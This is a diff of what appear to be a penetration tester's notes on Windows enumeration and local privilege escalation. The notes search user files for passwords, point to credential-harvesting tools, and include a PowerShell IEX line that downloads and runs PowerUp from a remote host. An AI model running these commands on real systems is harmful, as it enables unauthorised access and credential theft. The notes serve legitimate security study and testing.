@@ -1,18 +1,29 @@
 # Windows Enumeration
 
-## If the host is running a webapp
+## General Tips
 
-	Go look at the webapp dir to find configs and he code
-	Go look at the database
-	Look at the configs of the other apps running: ftp, mails, etc
-	Search users home with:
-		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg
-		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg | select-string password
+If the target is running a webapp
 
-	Use Snaffler to try to find credentials:
-		https://github.com/Andre92Marcos/tools/tree/master/snaffler
-	Use laZagne to try to find credentials:
-		https://github.com/AndreMIsidoro/tools/tree/master/laZagne
+- Go look at the webapp dir to find configs and he code
+- Go look at the database
+
+
+Look at the configs of the other apps running: ftp, mails, etc
+
+Search users home with:
+
+- get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg
+- get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg | select-string password
+
+	
+Try to find credentials with snaffler and laZagne
+
+- https://github.com/Andre92Marcos/tools/tree/master/snaffler
+- https://github.com/AndreMIsidoro/tools/tree/master/laZagne
+
+## Try some local privesc attacks
+
+https://github.com/AndreMIsidoro/escalations/blob/master/ad_attacks_enum/README.md#local-privilege-escalation
 
 
 ## Basic System Information
@@ -167,19 +178,12 @@ Check if Windows version has any known vulnerability (also check the patches app
 	accesschk.exe /accepteula \\.\Pipe\<name_of_pipe> -v		Enumerate permissions of pipe. We are looking for a pipe we have WRITE permissions for our user
 		https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
 	accesschk.exe -w \pipe\* -v		Enumerates all pipes that have WRITE permission
-	Use powersploit powerup to check miss configurations
-		https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
-		IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp.ps1")
-		Then run is ps:
-		Invoke-AllChecks
 
 
 ## Check weak permission
 
 	Use the sharpup too to check service binaries suffering from weak ACLS
 
-		SharpUP.exe audit
-			https://github.com/GhostPack/SharpUp/
 	Check permissions using icacls
 		https://ss64.com/nt/icacls.html
 
@@ -196,10 +200,23 @@ Use impacket-wmiexec with rpc port 135:
 	https://github.com/Andre92Marcos/tools/blob/master/impacket/wmiexec.md
 
 
-## Try WinPeas
+## Try Tools
+
+Use winPEAS
 
 	https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
+User PowerUP or SharpUp
+
+```powershell
+#https://github.com/GhostPack/SharpUp/
+SharpUP.exe audit
+
+#https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp.ps1")
+#Then run is ps:
+Invoke-AllChecks
+```
 
 ## Other Info
 
